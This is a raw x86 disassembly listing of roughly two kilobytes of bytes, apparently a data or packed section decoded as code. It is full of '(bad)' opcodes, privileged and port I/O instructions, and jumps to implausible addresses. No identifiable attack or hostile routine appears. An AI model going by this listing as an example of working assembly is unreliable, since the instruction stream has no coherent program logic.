  41a2c2:	xchg   DWORD PTR [edx-0x2794984c],ecx
  41a2c8:	cld    
  41a2c9:	push   0x3c3ace29
  41a2ce:	sub    edi,DWORD PTR [eax+0x4ef75484]
  41a2d4:	mov    eax,0xc3c7efd7
  41a2d9:	add    al,dl
  41a2db:	aam    0x6
  41a2dd:	mov    ah,0xe
  41a2df:	repz ret 
  41a2e1:	les    esi,FWORD PTR [edx-0x2f]
  41a2e4:	arpl   WORD PTR [eax+esi*2-0x28a6a234],cx
  41a2eb:	shl    DWORD PTR [edx+0x3f3ee6dd],1
  41a2f1:	inc    ecx
  41a2f2:	and    edi,DWORD PTR [ebp+ebp*8-0x19dd6cf8]
  41a2f9:	add    BYTE PTR [ecx+esi*4-0x1bf92526],0xd6
  41a301:	dec    ebx
  41a302:	pop    ebx
  41a303:	sub    DWORD PTR [eax+0x3d],esi
  41a306:	adc    DWORD PTR [ecx+ebx*1],0xacc1b1b0
  41a30d:	jnp    0x41a355
  41a30f:	mov    al,ds:0x9318ac38
  41a314:	cli    
  41a315:	push   esi
  41a316:	jge    0x41a355
  41a318:	mov    edi,0x1a7b4bbb
  41a31d:	add    cl,BYTE PTR [esi+0x61]
  41a320:	push   ebx
  41a321:	push   edi
  41a322:	mov    eax,ds:0x76f95c38
  41a327:	xor    bh,dh
  41a329:	jb     0x41a303
  41a32b:	fneni(8087 only) 
  41a32d:	aam    0x2a
  41a32f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a330:	adc    esp,DWORD PTR [ecx]
  41a332:	inc    esi
  41a333:	loop   0x41a308
  41a335:	fist   DWORD PTR [edx]
  41a337:	cwde   
  41a338:	add    BYTE PTR [esp+edi*8-0x6f],ah
  41a33c:	ds pop ds
  41a33e:	(bad)  [ebx-0x19543ca0]
  41a344:	push   es
  41a345:	xchg   ecx,eax
  41a346:	cld    
  41a347:	sbb    al,0x30
  41a349:	push   ds
  41a34a:	adc    ch,al
  41a34c:	loopne 0x41a378
  41a34e:	(bad)  
  41a34f:	mov    ch,0x7b
  41a351:	(bad)  
  41a353:	add    ecx,DWORD PTR ds:0x7aeadd96
  41a359:	pop    edi
  41a35a:	sub    edx,DWORD PTR [edi+0x7d]
  41a35d:	out    dx,eax
  41a35e:	ret    
  41a35f:	bound  ecx,QWORD PTR [ebx+0x22]
  41a362:	je     0x41a3db
  41a364:	add    DWORD PTR [esi+0x215d16df],0x1e
  41a36b:	call   0xedba4d1f
  41a370:	outs   dx,DWORD PTR ds:[esi]
  41a371:	jno    0x41a3dc
  41a373:	jecxz  0x41a33b
  41a375:	rol    DWORD PTR [esi-0x44a78c5e],1
  41a37b:	xchg   ebp,eax
  41a37c:	test   BYTE PTR [ebp+0x76547b13],bl
  41a382:	xchg   edx,eax
  41a383:	and    DWORD PTR ss:[eax+0x1],ecx
  41a387:	fidiv  WORD PTR [edi]
  41a389:	xchg   ebp,eax
  41a38a:	shl    ch,0xc5
  41a38d:	mov    dh,0x5a
  41a38f:	lock mov al,0xb1
  41a392:	stc    
  41a393:	dec    esp
  41a394:	pop    ecx
  41a395:	dec    edx
  41a396:	or     eax,DWORD PTR [ebx+0xa50adad]
  41a39c:	repnz test eax,0xe4631b8
  41a3a2:	push   ss
  41a3a3:	inc    edx
  41a3a4:	mov    ch,0xb2
  41a3a6:	push   ss
  41a3a7:	out    dx,al
  41a3a8:	mov    eax,0x8ce6740f
  41a3ad:	sbb    BYTE PTR [eax],0x34
  41a3b0:	sbb    ebx,DWORD PTR [edi+0x4321bf9e]
  41a3b6:	pushf  
  41a3b7:	inc    edx
  41a3b8:	daa    
  41a3b9:	pop    eax
  41a3ba:	inc    ebp
  41a3bb:	retf   0x2418
  41a3be:	das    
  41a3bf:	out    0x76,al
  41a3c1:	test   eax,0xdb483088
  41a3c6:	repz xor BYTE PTR [edx+ebp*8-0x29],ah
  41a3cb:	enter  0x88b9,0x34
  41a3cf:	clc    
  41a3d0:	or     eax,0x20622b22
  41a3d5:	aaa    
  41a3d6:	mov    eax,ds:0x13bd06d5
  41a3db:	int3   
  41a3dc:	adc    bh,BYTE PTR [edx+0x7394cca4]
  41a3e2:	or     cl,bl
  41a3e4:	xor    edx,DWORD PTR [eax+0x70fd08c1]
  41a3ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3eb:	add    al,0x8f
  41a3ed:	dec    ebx
  41a3ee:	fdivr  st,st(1)
  41a3f0:	push   ecx
  41a3f1:	cld    
  41a3f2:	in     eax,dx
  41a3f3:	mov    al,0xae
  41a3f5:	scas   eax,DWORD PTR es:[edi]
  41a3f6:	xchg   ebx,eax
  41a3f7:	push   0xffffffac
  41a3f9:	(bad)  
  41a3fb:	xlat   BYTE PTR ds:[ebx]
  41a3fc:	sbb    DWORD PTR [edx],eax
  41a3fe:	fnstcw WORD PTR [ecx-0x641d35e0]
  41a404:	or     bl,0x1d
  41a407:	loop   0x41a473
  41a409:	cli    
  41a40a:	(bad)  
  41a40b:	fmul   DWORD PTR [eax-0x15045aac]
  41a411:	les    edi,FWORD PTR [ebp+0x67]
  41a414:	ret    
  41a415:	sub    eax,0xb9745731
  41a41a:	or     al,0x5f
  41a41c:	inc    esp
  41a41d:	xchg   esi,eax
  41a41e:	nop
  41a41f:	or     eax,0x6b05884b
  41a424:	xchg   ecx,eax
  41a425:	xchg   esi,eax
  41a426:	dec    ecx
  41a427:	ja     0x41a431
  41a429:	stc    
  41a42a:	xchg   ecx,eax
  41a42b:	fwait
  41a42c:	int    0x8b
  41a42e:	dec    esp
  41a42f:	shl    bh,1
  41a431:	cmp    BYTE PTR [edx-0x65],dh
  41a434:	ins    BYTE PTR es:[edi],dx
  41a435:	fldenv [ecx]
  41a437:	push   edi
  41a438:	out    0xd3,eax
  41a43a:	inc    esp
  41a43b:	nop
  41a43c:	dec    esi
  41a43d:	jl     0x41a4bd
  41a43f:	mov    ecx,0x66d52ecf
  41a444:	cs aaa 
  41a446:	mov    ecx,0xdbebb8f1
  41a44b:	sbb    al,0xb4
  41a44d:	mov    ecx,0x55b7321
  41a452:	lahf   
  41a453:	mov    ch,0xb2
  41a455:	add    al,0x9b
  41a457:	retf   
  41a458:	cmc    
  41a459:	adc    al,0xc0
  41a45b:	sub    dh,BYTE PTR [edx]
  41a45d:	add    ecx,esp
  41a45f:	popf   
  41a460:	ins    BYTE PTR es:[edi],dx
  41a461:	(bad)  
  41a462:	out    dx,al
  41a463:	push   esp
  41a464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a465:	push   es
  41a466:	add    cl,BYTE PTR [edx]
  41a468:	js     0x41a3fa
  41a46a:	outs   dx,BYTE PTR ds:[esi]
  41a46b:	bswap  eax
  41a46d:	ds xchg esi,eax
  41a46f:	ficomp WORD PTR [eax+0x23b06bf0]
  41a475:	mov    dl,0x8e
  41a477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a479:	mov    esp,0xb738a823
  41a47e:	push   0x11070b4d
  41a483:	xchg   ebx,eax
  41a484:	outs   dx,BYTE PTR ds:[esi]
  41a485:	cmp    edx,DWORD PTR [bp+di+0x5e12]
  41a48a:	and    esi,edx
  41a48c:	nop
  41a48d:	mov    edx,0x300b4fac
  41a492:	lods   eax,DWORD PTR ds:[esi]
  41a493:	pop    ss
  41a494:	push   ebp
  41a495:	inc    ebx
  41a496:	pop    ebx
  41a497:	mov    al,ds:0xc1ddeeba
  41a49c:	mov    eax,edi
  41a49e:	sbb    ch,0x83
  41a4a1:	mov    al,0x66
  41a4a3:	mov    edx,0xaf4e1b6e
  41a4a8:	stos   BYTE PTR es:[edi],al
  41a4a9:	dec    BYTE PTR [esi+0x189d7157]
  41a4af:	and    eax,0x13a2ea7
  41a4b4:	fld    st(4)
  41a4b6:	imul   esi,DWORD PTR fs:[ebx],0x719c20b0
  41a4bd:	aam    0xbe
  41a4bf:	mov    ah,0xac
  41a4c1:	outs   dx,BYTE PTR ds:[esi]
  41a4c2:	add    DWORD PTR [eax+0x6],ebx
  41a4c5:	push   ebx
  41a4c6:	fldenv [esi-0x1d89fd80]
  41a4cc:	clc    
  41a4cd:	fistp  WORD PTR [esi]
  41a4cf:	std    
  41a4d0:	pusha  
  41a4d1:	cmp    al,0x69
  41a4d3:	je     0x41a527
  41a4d5:	jp     0x41a4e7
  41a4d7:	test   esp,ebp
  41a4d9:	ret    
  41a4da:	nop
  41a4db:	cmp    BYTE PTR [esi],0xdf
  41a4de:	imul   ebx,ebp,0xfffffff9
  41a4e1:	retf   0xabf2
  41a4e4:	clc    
  41a4e5:	sahf   
  41a4e6:	fs addr16 dec ebp
  41a4e9:	lods   al,BYTE PTR ds:[esi]
  41a4ea:	ss mov esp,0x6d177c9a
  41a4f0:	(bad)  [eax]
  41a4f2:	mov    cl,0xcc
  41a4f4:	push   0x5acf48aa
  41a4f9:	ret    0x46ad
  41a4fc:	(bad)  
  41a4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4fe:	sub    edx,DWORD PTR [edi+0x2864d107]
  41a504:	xor    dh,BYTE PTR [edx]
  41a506:	sbb    DWORD PTR [ebx-0x22],edi
  41a509:	scas   al,BYTE PTR es:[edi]
  41a50a:	push   ebp
  41a50b:	ins    BYTE PTR es:[edi],dx
  41a50c:	test   DWORD PTR [esi+edx*8+0x263cb8cc],esp
  41a513:	fnstenv [esi]
  41a515:	mov    ds:0xd83eef10,al
  41a51a:	or     ch,BYTE PTR [eax-0x317e2bfc]
  41a520:	pop    DWORD PTR [eax-0x16]
  41a523:	jo     0x41a586
  41a525:	cmp    ebx,DWORD PTR [esi-0x78]
  41a528:	mov    BYTE PTR [edx],ah
  41a52a:	jmp    0x41a4df
  41a52c:	jmp    0xd8fd:0x4ef6572b
  41a533:	cmc    
  41a534:	cs loop 0x41a4ff
  41a537:	sahf   
  41a538:	push   eax
  41a539:	(bad)  [ecx]
  41a53b:	les    ecx,FWORD PTR [ebp+0x50ee5787]
  41a541:	push   ds
  41a542:	(bad)  [edi+0xf3e1a10]
  41a548:	jle    0x41a52a
  41a54a:	cmp    ebx,eax
  41a54c:	sub    dh,BYTE PTR [esi+edx*4+0x7d]
  41a550:	xchg   ecx,eax
  41a551:	(bad)  
  41a553:	push   eax
  41a554:	cmp    DWORD PTR [eax],edi
  41a556:	mov    ch,0x74
  41a558:	mov    dh,0x77
  41a55a:	or     DWORD PTR [esp-0x43e1aa2e],esp
  41a561:	loopne 0x41a530
  41a563:	xabort 0xfe
  41a566:	mov    DWORD PTR [edx],edx
  41a568:	popa   
  41a569:	aam    0x8
  41a56b:	mov    ds:0xe899f849,eax
  41a570:	sbb    ch,BYTE PTR [eax-0x4de3dac3]
  41a576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a577:	dec    ebp
  41a578:	fsub   QWORD PTR [ebx]
  41a57a:	push   eax
  41a57b:	into   
  41a57c:	enter  0x1029,0xba
  41a580:	jecxz  0x41a55e
  41a582:	cld    
  41a583:	dec    esp
  41a584:	push   edi
  41a585:	pop    edi
  41a586:	rol    BYTE PTR [ecx-0x1e704b2f],1
  41a58c:	ins    DWORD PTR es:[edi],dx
  41a58d:	fnstsw WORD PTR [edi+0x72]
  41a590:	jmp    0x41a5e4
  41a592:	lds    edi,FWORD PTR [ecx]
  41a594:	in     al,0xfa
  41a596:	shr    BYTE PTR [esi],cl
  41a598:	sub    esi,DWORD PTR ds:0x20b693c8
  41a59e:	cmp    eax,0x364fbc91
  41a5a3:	cmp    eax,0x48843a77
  41a5a8:	or     eax,DWORD PTR [edi+0x66]
  41a5ab:	lods   al,BYTE PTR ds:[esi]
  41a5ac:	jmp    0x41a58c
  41a5ae:	mov    eax,0xcb1a0152
  41a5b3:	pop    ebx
  41a5b4:	xor    BYTE PTR [ebx-0x6b],ah
  41a5b7:	test   bh,bh
  41a5b9:	jmp    0xb8d5:0xf75369df
  41a5c0:	inc    ebp
  41a5c1:	xor    eax,DWORD PTR [esi-0x2]
  41a5c4:	stos   BYTE PTR es:[edi],al
  41a5c5:	sbb    BYTE PTR [ebx-0x56ebc657],al
  41a5cb:	ds retf 
  41a5cd:	jnp    0x41a5b0
  41a5cf:	pushf  
  41a5d0:	jl     0x41a566
  41a5d2:	jmp    0x5eb924a6
  41a5d7:	xor    BYTE PTR [ecx],dh
  41a5d9:	xor    DWORD PTR [edx+esi*4-0x3901848f],edi
  41a5e0:	les    edi,FWORD PTR [eax]
  41a5e2:	adc    BYTE PTR [ebx+edi*4+0x13d93d14],ch
  41a5e9:	(bad)  
  41a5ea:	in     al,0x38
  41a5ec:	aam    0x45
  41a5ee:	sbb    eax,0x31b54499
  41a5f3:	dec    esp
  41a5f4:	in     eax,dx
  41a5f5:	fimul  WORD PTR [edi]
  41a5f7:	retf   
  41a5f8:	inc    ebx
  41a5f9:	xor    dh,BYTE PTR [edx-0x6f]
  41a5fc:	sub    BYTE PTR [edx+ebp*4+0x49],bl
  41a600:	mov    ebp,eax
  41a602:	aas    
  41a603:	and    ch,BYTE PTR [ecx-0x6be13655]
  41a609:	xor    al,0xf3
  41a60b:	sbb    al,0x58
  41a60d:	cwde   
  41a60e:	adc    esi,eax
  41a610:	sub    al,0xd5
  41a612:	and    eax,0x8c48ff07
  41a617:	shr    BYTE PTR [eax+ecx*2-0x24d84df0],0x86
  41a61f:	not    DWORD PTR [esi]
  41a621:	pop    esp
  41a622:	outs   dx,DWORD PTR ds:[esi]
  41a623:	mov    ebx,0x2994dcc3
  41a628:	fadd   DWORD PTR [ebp+ebx*8+0x41]
  41a62c:	cdq    
  41a62d:	mov    al,ds:0xcc170cd7
  41a632:	xchg   ecx,eax
  41a633:	or     edx,DWORD PTR [edx-0x4de57b0d]
  41a639:	arpl   WORD PTR [ecx],si
  41a63b:	xchg   DWORD PTR [ecx+0x162aa14a],edx
  41a641:	xchg   edx,eax
  41a642:	push   ebx
  41a643:	cdq    
  41a644:	mov    edx,0x22b29536
  41a649:	bound  ebp,QWORD PTR [edx+0x4]
  41a64c:	inc    edi
  41a64d:	xchg   BYTE PTR [edx-0x2c],dl
  41a650:	pop    ecx
  41a651:	movlhps xmm3,xmm3
  41a654:	cmc    
  41a655:	add    al,0x46
  41a657:	lock xchg ebp,eax
  41a659:	mov    ds,esi
  41a65b:	data16 mov dl,0xf9
  41a65e:	push   edx
  41a65f:	pop    edx
  41a660:	lahf   
  41a661:	xlat   BYTE PTR ds:[ebx]
  41a662:	xor    eax,0x57cb3dda
  41a667:	jo     0x41a659
  41a669:	xor    BYTE PTR [esi],cl
  41a66b:	sbb    BYTE PTR [eax+0x22],ah
  41a66e:	mov    esp,DWORD PTR ds:0x4506a78e
  41a674:	xor    edi,DWORD PTR [ecx+0x52]
  41a677:	mov    di,0x9a93
  41a67b:	xor    ch,ah
  41a67d:	mov    ch,0x20
  41a67f:	mov    ds:0x2f2a321e,eax
  41a684:	in     eax,dx
  41a685:	sbb    eax,0xac913f27
  41a68a:	jmp    DWORD PTR [eax+0x19]
  41a68d:	mov    ebp,0x2c340c4e
  41a692:	mov    ch,0x20
  41a694:	(bad)  
  41a695:	out    0xbe,eax
  41a697:	fidivr WORD PTR [eax+ebx*1-0x15]
  41a69b:	mov    ecx,0xceb5bad6
  41a6a0:	repz into 
  41a6a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6a3:	jp     0x41a637
  41a6a5:	mov    fs,esi
  41a6a7:	mov    BYTE PTR [ebp-0x28],ch
  41a6aa:	aam    0x1d
  41a6ac:	test   ebp,0x114744d6
  41a6b2:	jmp    0xe4a9221f
  41a6b7:	adc    DWORD PTR [ebx-0x4106e4e6],edx
  41a6bd:	int    0xc5
  41a6bf:	lahf   
  41a6c0:	rol    esp,0x88
  41a6c3:	pop    esi
  41a6c4:	pop    edx
  41a6c5:	sbb    ecx,DWORD PTR [edx+0x1]
  41a6c8:	push   ds
  41a6c9:	in     al,dx
  41a6ca:	mov    bl,0x66
  41a6cc:	pop    esi
  41a6cd:	fisubr WORD PTR [eax-0x4dde557f]
  41a6d3:	mov    ch,0x43
  41a6d5:	mov    ecx,0xdbb638a7
  41a6da:	add    DWORD PTR [ebx-0x5d],0xffffffb7
  41a6de:	jns    0x41a6ca
  41a6e0:	out    dx,al
  41a6e1:	xchg   BYTE PTR [ebx+edi*1],al
  41a6e4:	sbb    DWORD PTR [esi-0x7120baf8],edx
  41a6ea:	add    bl,BYTE PTR [ecx]
  41a6ec:	ret    
  41a6ed:	push   eax
  41a6ee:	fidiv  WORD PTR [edx-0xad3fd6a]
  41a6f4:	and    eax,0x3293f9a3
  41a6f9:	mov    ah,BYTE PTR [esp+ebp*2-0x5439295c]
  41a700:	pop    edi
  41a701:	xchg   ebx,eax
  41a702:	mov    al,ds:0xa761045
  41a707:	sub    ch,ah
  41a709:	dec    edi
  41a70a:	in     eax,0x3c
  41a70c:	imul   esi,DWORD PTR [edi+0x3ee191da],0x74936921
  41a716:	scas   eax,DWORD PTR es:[edi]
  41a717:	inc    ebp
  41a718:	sbb    ebx,esp
  41a71a:	call   0x8afa3f26
  41a71f:	retf   
  41a720:	add    DWORD PTR [edx+0x8],ebp
  41a723:	adc    dh,al
  41a725:	adc    DWORD PTR [ecx+0x7b],ebp
  41a728:	es cmp eax,ebp
  41a72b:	pop    esi
  41a72c:	dec    edx
  41a72d:	dec    esi
  41a72e:	and    cl,bh
  41a730:	fmul   st(2),st
  41a732:	mov    DWORD PTR [ecx+0x7c1ff2a1],0x18b65595
  41a73c:	or     bl,BYTE PTR [edi]
  41a73e:	sbb    ebp,DWORD PTR [eax+0x39]
  41a741:	arpl   WORD PTR [esi],bp
  41a743:	sub    cl,BYTE PTR [esi-0x137258d4]
  41a749:	add    al,0x30
  41a74b:	dec    ecx
  41a74c:	(bad)  
  41a74d:	jl     0x41a7ce
  41a74f:	into   
  41a750:	pop    ebp
  41a751:	stos   BYTE PTR es:[edi],al
  41a752:	sub    eax,0x85964668
  41a757:	or     ebp,DWORD PTR [eax-0x4c]
  41a75a:	push   es
  41a75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a75c:	xchg   edx,eax
  41a75d:	mov    esp,0xff6a3da4
  41a762:	ins    DWORD PTR es:[edi],dx
  41a763:	data16 add BYTE PTR [ecx],al
  41a766:	shl    BYTE PTR ds:0xecd04c43,1
  41a76c:	sub    al,0x54
  41a76e:	mov    bl,0x61
  41a770:	fcomp  DWORD PTR [eax+eax*8+0xcc2ad72]
  41a777:	es mov bl,0xcb
  41a77a:	fwait
  41a77b:	daa    
  41a77c:	xchg   ecx,eax
  41a77d:	outs   dx,BYTE PTR ds:[esi]
  41a77e:	out    dx,eax
  41a77f:	xchg   ebp,eax
  41a780:	sbb    cl,BYTE PTR [eax]
  41a782:	in     eax,0x5e
  41a784:	xchg   esi,eax
  41a785:	xchg   BYTE PTR [esi],ah
  41a787:	inc    ecx
  41a788:	xor    al,BYTE PTR [ecx-0x4c2c04bc]
  41a78e:	(bad)  [ebx-0x5f]
  41a791:	imul   esi,esp,0x8957ab0e
  41a797:	ins    DWORD PTR es:[edi],dx
  41a798:	mov    al,0x9e
  41a79a:	and    edi,eax
  41a79c:	inc    esi
  41a79d:	and    DWORD PTR [eax+0x46],ecx
  41a7a0:	cmp    edx,esi
  41a7a2:	and    esp,esp
  41a7a4:	enter  0xdfa9,0xec
  41a7a8:	dec    esi
  41a7a9:	xchg   edi,eax
  41a7aa:	nop
  41a7ab:	sbb    eax,0x6ec9dadd
  41a7b0:	pusha  
  41a7b1:	lds    eax,FWORD PTR [ebx]
  41a7b3:	lods   al,BYTE PTR ds:[esi]
  41a7b4:	pop    ebx
  41a7b5:	bound  eax,QWORD PTR [esi+esi*2+0x78]
  41a7b9:	scas   eax,DWORD PTR es:[edi]
  41a7ba:	out    0x91,eax
  41a7bc:	scas   al,BYTE PTR es:[edi]
  41a7bd:	xchg   ebx,eax
  41a7be:	mov    al,0xd7
  41a7c0:	and    bl,BYTE PTR ds:0xe2a8dbb8
  41a7c6:	leave  
  41a7c7:	ret    0x5c20
  41a7ca:	adc    dh,dh
  41a7cc:	shl    cl,cl
  41a7ce:	or     ch,BYTE PTR [edi+eiz*4+0x87c5a83]
  41a7d5:	in     al,dx
  41a7d6:	cwde   
  41a7d7:	sbb    ah,bl
  41a7d9:	fwait
  41a7da:	addr16 popa 
  41a7dc:	add    ebp,ecx
  41a7de:	sbb    BYTE PTR [ecx-0x376b0378],0x10
  41a7e5:	push   esi
  41a7e6:	fst    DWORD PTR [edi]
  41a7e8:	hlt    
  41a7e9:	xor    dl,dh
  41a7eb:	dec    edi
  41a7ec:	in     eax,0xd0
  41a7ee:	mov    ah,0x36
  41a7f0:	mov    ebx,0x31183386
  41a7f5:	mov    esi,DWORD PTR [ecx+ecx*8]
  41a7f8:	push   edx
  41a7f9:	adc    eax,0xcb32647d
  41a7fe:	jo     0x41a7e7
  41a800:	in     eax,dx
  41a801:	stos   DWORD PTR es:[edi],eax
  41a802:	mov    dh,BYTE PTR [eax+0x632ece60]
  41a808:	pop    eax
  41a809:	repnz ss xchg al,bh
  41a80d:	push   ecx
  41a80e:	rcl    DWORD PTR [edx],0x63
  41a811:	fisub  WORD PTR [ecx-0x752eaa7b]
  41a817:	or     al,0x2b
  41a819:	mov    ebp,0x2e01c675
  41a81e:	jns    0x41a7e6
  41a820:	mov    BYTE PTR [edx],bl
  41a822:	mov    edx,0xd93da888
  41a827:	pop    esp
  41a828:	call   0x401cd90f
  41a82d:	mov    BYTE PTR [esi+0x6],dh
  41a830:	or     ch,dl
  41a832:	xor    al,0x7
  41a834:	jae    0x41a85a
  41a836:	sub    al,0x3a
  41a838:	(bad)  
  41a83a:	int    0xff
  41a83c:	xchg   edi,eax
  41a83d:	mov    ds:0x5a206e9d,eax
  41a842:	xor    BYTE PTR [edi+0x5aa24d87],bl
  41a848:	ins    DWORD PTR es:[edi],dx
  41a849:	int3   
  41a84a:	lock aam 0xa9
  41a84d:	sbb    eax,0x69f0d0f7
  41a852:	push   esp
  41a853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a854:	jb     0x41a864
  41a856:	sbb    dh,BYTE PTR [ecx-0x2036196e]
  41a85c:	xor    BYTE PTR [edx],bh
  41a85e:	sbb    al,0x1b
  41a860:	out    dx,eax
  41a861:	mov    eax,ds:0xc440ff6
  41a866:	loope  0x41a82b
  41a868:	mov    eax,ds:0x68e8c7df
  41a86d:	mov    DWORD PTR [edx-0xc],ebx
  41a870:	test   DWORD PTR [edx+0x56d327],edx
  41a876:	div    BYTE PTR [edi]
  41a878:	ja     0x41a860
  41a87a:	mov    ah,0x9a
  41a87c:	xor    eax,0xb9beae95
  41a881:	dec    cl
  41a883:	adc    BYTE PTR [ebx-0x15],0xa4
  41a887:	fdivr  DWORD PTR [esi+0x4aa9e060]
  41a88d:	mov    BYTE PTR [eax],cl
  41a88f:	dec    ecx
  41a890:	xchg   ebx,ebx
  41a892:	(bad)  
  41a893:	xchg   ebx,eax
  41a894:	push   0xffffff86
  41a896:	out    dx,al
  41a897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a898:	scas   eax,DWORD PTR es:[edi]
  41a899:	pop    es
  41a89a:	mov    esp,0xa8d79ba7
  41a89f:	xchg   ah,dh
  41a8a1:	jmp    0x41a826
  41a8a3:	and    dl,BYTE PTR [edx]
  41a8a5:	cmp    BYTE PTR [ebp-0x34bcc0c6],ah
  41a8ab:	jne    0x41a8f9
  41a8ad:	fldl2t 
  41a8af:	shl    DWORD PTR [esi],1
  41a8b1:	cmp    eax,0xf1a9b4d0
  41a8b6:	xor    edx,DWORD PTR [edi+0x1c547230]
  41a8bc:	loopne 0x41a90b
  41a8be:	test   bl,bh
  41a8c0:	jnp    0x41a931
  41a8c2:	sub    BYTE PTR [edx-0x6bed598a],ah
  41a8c8:	inc    esp
  41a8c9:	cs inc ebx
  41a8cb:	mov    WORD PTR [ebx],ss
  41a8cd:	ja     0x41a88d
  41a8cf:	mov    eax,ds:0xc93a1d15
  41a8d4:	pop    esi
  41a8d5:	sbb    BYTE PTR [esp+ebx*1-0xcec26a7],bh
  41a8dc:	pop    ecx
  41a8dd:	leave  
  41a8de:	pop    edx
  41a8df:	test   al,0xf
  41a8e1:	inc    ebp
  41a8e2:	retf   
  41a8e3:	inc    ebp
  41a8e4:	push   es
  41a8e5:	pop    ds
  41a8e6:	dec    edx
  41a8e7:	xchg   esi,eax
  41a8e8:	repnz dec edi
  41a8ea:	pushf  
  41a8eb:	dec    ebp
  41a8ec:	pop    ebp
  41a8ed:	repz push es
  41a8ef:	es pop esp
  41a8f1:	rol    ah,1
  41a8f3:	les    ebx,FWORD PTR [ebx+0x1396ff14]
  41a8f9:	mov    dl,0x16
  41a8fb:	push   ebp
  41a8fc:	mov    ch,0x9b
  41a8fe:	jae    0x41a8b1
  41a900:	in     al,dx
  41a901:	add    bh,ch
  41a903:	inc    edx
  41a904:	pop    ebx
  41a905:	mov    ds:0x683b20be,eax
  41a90a:	scas   eax,DWORD PTR es:[edi]
  41a90b:	add    edi,DWORD PTR [ebx]
  41a90d:	jmp    0x41a956
  41a90f:	mov    dl,0x58
  41a911:	outs   dx,BYTE PTR ds:[esi]
  41a912:	ret    0xcb79
  41a915:	dec    ebx
  41a916:	icebp  
  41a917:	imul   ebp,DWORD PTR [esi+edi*1+0xb],0x4c
  41a91c:	sbb    eax,edx
  41a91e:	inc    edx
  41a91f:	inc    edi
  41a920:	(bad)  [ebp+0x72f0478f]
  41a926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a927:	mov    esi,0x4d4d16ec
  41a92c:	dec    eax
  41a92d:	sub    ecx,ebx
  41a92f:	ins    DWORD PTR es:[edi],dx
  41a930:	cwde   
  41a931:	lock adc eax,0xc6eb2fb5
  41a937:	add    ebx,DWORD PTR [ebx+0x656e9e87]
  41a93d:	cmp    esi,DWORD PTR [edi-0x36]
  41a940:	cmp    eax,0xffffffa3
  41a943:	push   cs
  41a944:	mov    bh,0x40
  41a946:	mov    eax,0x88b61a3b
  41a94b:	adc    al,0x99
  41a94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a94e:	pop    es
  41a94f:	push   eax
  41a950:	push   ds
  41a951:	and    DWORD PTR [edi],edx
  41a953:	call   0x8019:0x4a2735e0
  41a95a:	les    ecx,FWORD PTR [esi]
  41a95c:	aam    0x41
  41a95e:	ja     0x41a93b
  41a960:	jl     0x41a969
  41a962:	pop    esp
  41a963:	bound  esi,QWORD PTR ds:0xff04437e
  41a969:	jg     0x41a98d
  41a96b:	mov    gs,WORD PTR ds:0xd2718308
  41a971:	out    0xd1,eax
  41a973:	jbe    0x41a947
  41a975:	pop    esi
  41a976:	icebp  
  41a977:	dec    ebp
  41a978:	jl     0x41a9f8
  41a97a:	sti    
  41a97b:	or     BYTE PTR [edx-0x44db7bbe],bl
  41a981:	mov    ax,ax
  41a984:	mov    al,BYTE PTR [ecx]
  41a986:	mov    dh,BYTE PTR [ecx+0x2c]
  41a989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a98a:	retf   
  41a98b:	lods   al,BYTE PTR ds:[esi]
  41a98c:	mov    edi,0xbaddf9d5
  41a991:	cmp    DWORD PTR [ebx-0x3cf1dd77],esp
  41a997:	pop    edx
  41a998:	and    edx,esp
  41a99a:	or     DWORD PTR [eax+0x5d90c3ed],0x7c60c223
  41a9a4:	jno    0x41a927
  41a9a6:	push   0xcd395af5
  41a9ab:	fadd   DWORD PTR [ecx+0x5b]
  41a9ae:	pop    edi
  41a9af:	xor    esi,DWORD PTR [eax]
  41a9b1:	cmp    BYTE PTR [ebx],dl
  41a9b3:	or     eax,0x3613303b
  41a9b8:	xor    bh,0xa6
  41a9bb:	or     DWORD PTR [eax-0x78],ebx
  41a9be:	fwait
  41a9bf:	(bad)  
  41a9c0:	ja     0x41a955
  41a9c2:	push   esp
  41a9c3:	test   eax,0xa4ec0e25
  41a9c8:	mov    ebx,0x56ffdef1
  41a9cd:	cdq    
  41a9ce:	xchg   edx,eax
  41a9cf:	xchg   esi,eax
  41a9d0:	mov    ebp,0xa5fedae4
  41a9d5:	jmp    0x41aa03
  41a9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9d8:	into   
  41a9d9:	icebp  
  41a9da:	sahf   
  41a9db:	xor    BYTE PTR [ebx+eiz*1-0x703a6a9f],al
  41a9e2:	push   0xe89b128e
  41a9e7:	push   ds
  41a9e8:	push   DWORD PTR [eax-0x3f393ba3]
  41a9ee:	hlt    
  41a9ef:	mov    cl,0x14
  41a9f1:	div    DWORD PTR fs:[ecx+0x28394fd3]
  41a9f8:	mov    bl,0x4f
  41a9fa:	sbb    al,0x2
  41a9fc:	jle    0x41aa29
  41a9fe:	(bad)  
  41a9ff:	aas    
  41aa00:	stos   DWORD PTR es:[edi],eax
  41aa01:	sub    DWORD PTR [edx],ebp
  41aa03:	lods   al,BYTE PTR ds:[esi]
  41aa04:	xchg   al,ch
  41aa06:	mov    ah,0xbb
  41aa08:	xchg   edi,eax
  41aa09:	cmp    eax,0xeecd26
  41aa0e:	or     BYTE PTR [esi],cl
  41aa10:	int    0xec
  41aa12:	sar    bl,0x79
  41aa15:	mov    ecx,0x859147fd
  41aa1a:	cld    
  41aa1b:	cmp    ch,BYTE PTR [esi-0xd9c7550]
  41aa21:	and    eax,DWORD PTR [ebx-0x106241db]
  41aa27:	cdq    
  41aa28:	xchg   esp,esi
  41aa2a:	and    al,0x35
  41aa2c:	cmp    DWORD PTR [eax+eiz*8],edi
  41aa2f:	sub    dh,dh
